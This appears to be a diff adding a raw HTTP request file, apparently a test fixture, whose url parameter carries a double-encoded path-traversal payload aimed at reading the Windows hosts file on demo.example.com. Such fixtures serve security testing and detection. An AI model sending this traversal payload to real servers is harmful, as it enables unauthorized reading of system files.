@@ -1,0 +1,4 @@
+GET /a?url=..%255C..%255C..%255Csystem32%255Cdrivers%255Cetc%255Chosts HTTP/1.1
+Host: demo.example.com
+Connection: close
+
